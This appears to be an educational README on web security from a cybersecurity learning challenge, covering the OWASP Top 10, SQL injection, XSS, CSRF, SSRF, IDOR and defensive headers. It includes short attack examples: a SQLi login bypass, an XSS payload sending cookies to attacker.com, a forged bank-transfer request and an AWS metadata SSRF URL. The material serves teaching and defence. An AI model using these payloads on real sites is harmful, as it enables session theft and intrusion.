# 🕸️ Web Security

> **Domain:** Web Security  
> **Difficulty:** Beginner → Advanced  
> **Part of:** 100 Days - 100 Cybersecurity Projects

---

## 📌 What is Web Security?

Web Security focuses on protecting web applications, APIs, and browsers from attacks. Since most modern services are web-based, this is one of the most critical and actively exploited domains in cybersecurity. The gold standard reference is the **OWASP Top 10** — a list of the most critical web application security risks.

---

## 🧱 Core Concepts

### 1. How the Web Works (Security View)

```
Client (Browser)
    |
    |--- HTTP/HTTPS Request --->
    |                           Web Server (Nginx/Apache)
    |                               |
    |                           Application (Flask/Node/PHP)
    |                               |
    |                           Database (MySQL/PostgreSQL)
    |<-- HTTP Response ----------
```

Every layer above is an attack surface. Web security aims to secure each of them.

---

### 2. OWASP Top 10 (2021)

| #  | Vulnerability                          | Short Description                                    |
|----|----------------------------------------|------------------------------------------------------|
| A01 | Broken Access Control                 | Users can act outside their intended permissions     |
| A02 | Cryptographic Failures                | Sensitive data exposed due to weak/missing crypto    |
| A03 | Injection                             | Untrusted data sent to an interpreter (SQLi, etc.)   |
| A04 | Insecure Design                       | Missing security controls at the design level        |
| A05 | Security Misconfiguration             | Default credentials, open cloud storage, etc.        |
| A06 | Vulnerable Components                 | Outdated libraries/frameworks with known CVEs        |
| A07 | Auth & Session Failures               | Broken login, weak session management                |
| A08 | Software/Data Integrity Failures      | CI/CD pipeline attacks, insecure deserialization     |
| A09 | Security Logging Failures             | No logs = blind to attacks                           |
| A10 | SSRF                                  | Server tricked into making unintended requests       |

---

### 3. SQL Injection (SQLi)

One of the oldest and most dangerous vulnerabilities.

**How it works:**
```sql
-- Normal query
SELECT * FROM users WHERE username='admin' AND password='1234';

-- Injected query (attacker enters: admin' --)
SELECT * FROM users WHERE username='admin' --' AND password='';
-- The -- comments out the password check → login bypassed
```

**Types:**
- **Classic / In-band** — Results returned directly
- **Blind** — No visible output; inferred via true/false or time delays
- **Out-of-band** — Data exfiltrated via DNS/HTTP requests

**Prevention:**
- Use parameterized queries / prepared statements
- Input validation and sanitization
- Use ORM frameworks (SQLAlchemy, Hibernate)
- Least privilege database accounts

---

### 4. Cross-Site Scripting (XSS)

Attacker injects malicious scripts into pages viewed by other users.

**Types:**

| Type      | Description                                          |
|-----------|------------------------------------------------------|
| Reflected | Script in URL, executed immediately                  |
| Stored    | Script saved in DB, affects all users who view it    |
| DOM-based | Exploit happens entirely in the browser DOM          |

**Example payload:**
```html
<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
```

**Prevention:**
- Output encode all user-supplied data
- Use Content Security Policy (CSP) headers
- HTTPOnly and Secure flags on cookies
- Input validation

---

### 5. Cross-Site Request Forgery (CSRF)

Tricks an authenticated user into unknowingly submitting a request.

```html
<!-- Malicious page forces victim's browser to transfer money -->
<img src="https://bank.com/transfer?to=attacker&amount=1000">
```

**Prevention:**
- CSRF tokens (unique per session, per form)
- SameSite cookie attribute
- Check Origin/Referer headers

---

### 6. Broken Authentication

Weaknesses in login systems that allow attackers to compromise accounts.

**Common issues:**
- Weak/default passwords allowed
- No brute-force protection
- Session tokens not invalidated on logout
- JWT tokens signed with weak keys or `alg: none`
- Insecure "forgot password" flows

**Prevention:**
- Implement MFA
- Secure password storage (bcrypt, Argon2)
- Account lockout policies
- Secure session management (HttpOnly, Secure, short expiry)

---

### 7. Security Headers

HTTP response headers that harden the browser against attacks.

| Header                          | Purpose                                              |
|---------------------------------|------------------------------------------------------|
| `Content-Security-Policy`       | Controls which sources can load scripts/styles       |
| `X-Frame-Options`               | Prevents clickjacking via iframes                    |
| `Strict-Transport-Security`     | Forces HTTPS                                         |
| `X-Content-Type-Options`        | Prevents MIME sniffing                               |
| `Referrer-Policy`               | Controls what referrer info is sent                  |
| `Permissions-Policy`            | Restricts browser features (camera, mic, etc.)       |

---

### 8. Server-Side Request Forgery (SSRF)

Attacker makes the server issue requests on their behalf — often to internal services.

```
Attacker → Server → Internal API / AWS Metadata / Redis
```

**Example:** `?url=http://169.254.169.254/latest/meta-data/` (AWS metadata endpoint)

**Prevention:**
- Whitelist allowed domains/IPs
- Block internal IP ranges (10.x, 172.16.x, 169.254.x)
- Disable unnecessary URL fetching features

---

### 9. Insecure Direct Object References (IDOR)

Attacker accesses resources by manipulating object IDs.

```
https://site.com/invoice?id=1001  →  Change to id=1002 → access another user's invoice
```

**Prevention:**
- Enforce authorization checks on every request
- Use indirect references (GUIDs instead of sequential IDs)

---

## 🛠️ Tools to Know

| Tool        | Purpose                                      |
|-------------|----------------------------------------------|
| Burp Suite  | Web proxy for intercepting/modifying requests|
| OWASP ZAP   | Free web app vulnerability scanner           |
| sqlmap      | Automated SQL injection tool                 |
| Nikto       | Web server vulnerability scanner             |
| ffuf        | Fast web fuzzer (dirs, params, subdomains)   |
| Gobuster    | Directory and subdomain brute-forcing        |
| curl / httpie | CLI HTTP request tools                    |

---

## 📚 Key Terms Glossary

| Term          | Meaning                                                     |
|---------------|-------------------------------------------------------------|
| Cookie        | Small data stored in the browser, used for sessions         |
| JWT           | JSON Web Token — stateless auth token                       |
| CORS          | Cross-Origin Resource Sharing — controls cross-domain reqs  |
| WAF           | Web Application Firewall                                    |
| Fuzzing       | Sending random/malformed input to find bugs                 |
| Serialization | Converting objects to bytes/strings for transport           |
| Endpoint      | A specific URL route in a web app or API                    |

---

## 💡 Real-World CVE Examples

- **CVE-2017-5638** — Apache Struts RCE via injection in Content-Type header (Equifax breach)
- **Log4Shell (CVE-2021-44228)** — JNDI injection in log messages via Log4j
- **Heartbleed (CVE-2014-0160)** — OpenSSL buffer over-read exposing memory contents

---

## 🔗 Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) ← best free resource
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [HackTheBox Web Challenges](https://www.hackthebox.com/)
- [PentesterLab](https://pentesterlab.com/)

---

*Part of the 100 Days - 100 Cybersecurity Projects challenge by [@PrithikaGopinath](https://github.com/PrithikaGopinath)*
